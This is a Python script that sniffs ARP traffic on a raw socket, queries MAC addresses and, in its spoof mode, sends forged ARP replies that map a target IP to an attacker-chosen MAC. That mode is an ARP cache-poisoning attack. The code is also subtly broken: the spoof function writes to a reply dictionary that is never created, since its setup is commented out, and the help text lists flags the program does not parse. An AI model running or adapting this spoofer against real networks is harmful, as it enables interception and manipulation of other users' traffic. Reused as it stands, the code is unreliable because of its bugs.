# coding=utf-8
import socket
import sys,os
import struct
import uuid
import binascii


def GetSocketInfo():
    #create socket and receive all type of packets
    _Socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

    _Socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    _Socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    _Socket.bind((os.listdir('/sys/class/net/')[0], 0))
    #_Socket.bind(("enp0s5", 0))

    return _Socket

def getMyMac():
    List = []
    Mymac = uuid.getnode()
    count = 0
    while(count < 6):
        List = [Mymac % 0x100] + List
        Mymac //= 0x100
        count += 1
    return List

def GetPacketInfo():
    arp_init = {
        #arp init
        'my_mac' : struct.pack('!6B',*getMyMac()),
        'my_ip' : socket.inet_aton(socket.gethostbyname(socket.gethostname())),
        'arp_type' : struct.pack('!H', 0x0806)
    }
    packet = {

        #header
        'target_mac_addr' : struct.pack('!6B',0xFF,0xFF,0xFF,0xFF,0xFF,0xFF),
        'source_mac_addr' : struct.pack('!6B',*getMyMac()),
        'frame_type' : struct.pack('!H',0x0806),

        #arp body
        'arpbody_hw_type' : struct.pack('!H', 0x0001),
        'arpbody_protocal_type' : struct.pack('!H', 0x0800),
        'arpbody_hw_length' : struct.pack('!B', 0x06),
        'arpbody_protocal_length' : struct.pack('!B', 0x04),
        'arpbody_opcode' : struct.pack('!H', 0x0001),
        'arpbody_source_mac' : struct.pack('!6B',*getMyMac()),
        'arpbody_source_ip' : socket.inet_aton(socket.gethostbyname(socket.gethostname())),
        'arpbody_target_mac' : struct.pack('!6B',0,0,0,0,0,0),
        'arpbody_target_ip' : ''
    }
    return packet

def help():
    print("Format :")
    print("1) sudo python3.8 arp.py -l -a")
    print("2) sudo python3.8 arp.py -s <filter_ip_address>")
    print("3) sudo python3.8 -q <query_ip_address>")
    print("4) sudo python3.8 <fack_mac_address> <target_ip_address>")

def Receive(My_socket):
    My_packet = GetPacketInfo()
    #My_socket = GetSocketInfo()

    frame = My_socket.recvfrom(2048)

    header = frame[0][0:14]
    arpbody = frame[0][14:42]
    header_temp = struct.unpack("!6s6s2s", header)
    arpbody_temp = struct.unpack("!2s2s1s1s2s6s4s6s4s", arpbody)

    My_packet['target_mac_addr'] = binascii.hexlify(header_temp[0],':')
    My_packet['source_mac_addr'] = binascii.hexlify(header_temp[1],':')
    My_packet['frame_type'] = header_temp[2]

    My_packet['arpbody_opcode'] = arpbody_temp[4]
    My_packet['arpbody_source_mac'] = binascii.hexlify(arpbody_temp[5],':')
    My_packet['arpbody_source_ip'] = socket.inet_ntoa(arpbody_temp[6])
    My_packet['arpbody_target_mac'] = binascii.hexlify(arpbody_temp[7],':')
    My_packet['arpbody_target_ip'] = socket.inet_ntoa(arpbody_temp[8])

    return My_packet

def listening():
    print("### ARP sniffer mode ###")
    while True:
        _Packet = Receive(GetSocketInfo())
        #receive arp type packet only
        if _Packet['frame_type'] != b'\x08\x06':
            continue

        if _Packet['arpbody_opcode'] == b'\x00\x01':
            print("arp request")
        
        if _Packet['arpbody_opcode'] == b'\x00\x02':
            print("arp response")

        print("Get ARP packet - Who has " + _Packet['arpbody_target_ip'] + " ?      Tell " + _Packet['arpbody_source_ip'])

def Listening(ip):
    print("### ARP sniffer mode ###")
    
    while True:
        _Packet = Receive(GetSocketInfo())

        #receive arp type packet only
        if _Packet['frame_type'] != b'\x08\x06':
            continue
        #print(_Packet['arpbody_target_ip'])
        #receive target or source is "ip" only
        if _Packet['arpbody_target_ip'] != ip and _Packet['arpbody_source_ip'] != ip:
            continue

        if _Packet['arpbody_opcode'] == b'\x00\x01':
            print("arp request")
        
        if _Packet['arpbody_opcode'] == b'\x00\x02':
            print("arp response")

        print("Get ARP packet - Who has " + _Packet['arpbody_target_ip'] + " ?      Tell " + _Packet['arpbody_source_ip'])

def Query(ip):
    Arp_packet = GetPacketInfo()
    Arp_socket = GetSocketInfo()

    Arp_packet['arpbody_target_ip'] = socket.inet_aton(ip)

    Arp_packet_list = [ k for k in Arp_packet.values() ]
    
    #print(Arp_packet_list)

    #print(Arp_packet['arpbody_source_ip'])

    Arp_packet['arpbody_source_ip'] = socket.inet_ntoa(Arp_packet['arpbody_source_ip'])
    Arp_packet['arpbody_target_ip'] = socket.inet_ntoa(Arp_packet['arpbody_target_ip'])

    #print(Arp_packet['arpbody_target_ip'])

    Arp_socket.send(b''.join(Arp_packet_list))
    
    print("Get ARP packet - Who has " + Arp_packet['arpbody_target_ip'] + " ?      Tell " + Arp_packet['arpbody_source_ip'])

    while True:
        Arp_responce = Receive(Arp_socket)

        #receive arp type packet only
        if Arp_responce['frame_type'] != b'\x08\x06':
            continue
        
        #print("1" + Arp_responce['arpbody_source_ip'])
        #print("2" +ip)

        if Arp_responce['arpbody_source_ip'] == ip:
            #Arp_packet['arpbody_source_ip'] = socket.inet_ntoa(Arp_packet['arpbody_source_ip'])
            print("MAC address of " + Arp_responce['arpbody_source_ip'] + " is " + bytes.decode(Arp_responce['arpbody_source_mac']))
            break

def Spoof(fack_mac , target_ip):
    _Socket = GetSocketInfo()

    #fack_mac = fack_mac.replace(':','')
    fack_mac = str.encode(fack_mac)
    fack_mac = binascii.unhexlify(fack_mac.replace(b':', b''))
    #Arp_request = GetPacketInfo()
    while True:
        Arp_request = Receive(_Socket)

        #receive arp type packet only
        if Arp_request['frame_type'] != b'\x08\x06':
            continue

        #receive target arp request packet only
        if Arp_request['arpbody_opcode'] != b'\x00\x01' or Arp_request['arpbody_target_ip'] != target_ip:
            continue
            print("arp request")
 
        print("Arp request target ip is " + Arp_request['arpbody_target_ip'])

        print("fack arp responce :")

        #fack_arp_responce = GetPacketInfo()
        
        #print(Arp_request['arpbody_source_mac'])
        Arp_request['arpbody_source_mac'] = bytes.decode(Arp_request['arpbody_source_mac'])
        #print(Arp_request['arpbody_source_mac'])
        Arp_request['arpbody_source_mac'] = Arp_request['arpbody_source_mac'].replace(':','')
        #print(binascii.unhexlify(Arp_request['arpbody_source_mac']))

        #print(Arp_request['arpbody_source_ip'])
        #print(Arp_request['arpbody_target_ip'])


        fack_arp_responce['target_mac_addr'] = binascii.unhexlify(Arp_request['arpbody_source_mac'])
        fack_arp_responce['source_mac_addr'] = fack_mac

        fack_arp_responce['arpbody_opcode'] = struct.pack('!H', 0x0002)
        fack_arp_responce['arpbody_source_mac'] = fack_mac
        fack_arp_responce['arpbody_target_ip'] = socket.inet_aton(Arp_request['arpbody_source_ip'])
        fack_arp_responce['arpbody_source_ip'] = socket.inet_aton(target_ip)
        fack_arp_responce['arpbody_target_mac'] = binascii.unhexlify(Arp_request['arpbody_source_mac'])
        
        
        fack_arp_responce_list = [ k for k in fack_arp_responce.values() ]

        #print(fack_arp_responce_list)
        _Socket.send(b''.join(fack_arp_responce_list))
        print("Send successfull.")




def main(arg):
    if os.geteuid() != 0:
        print("ERROR: You must be root to use the tool!")
        exit()

    print("[ ARP sniffer and spoof program ]")

    if arg[0] == '-help':
        help()
    elif arg == ['-l','-a']:
        listening()
    elif arg[0] == '-l':
        Listening(arg[1])
    elif arg[0] == '-q':
        Query(arg[1])
    else:
        Spoof(arg[0],arg[1])
    



if __name__ == '__main__':
    main(sys.argv[1:])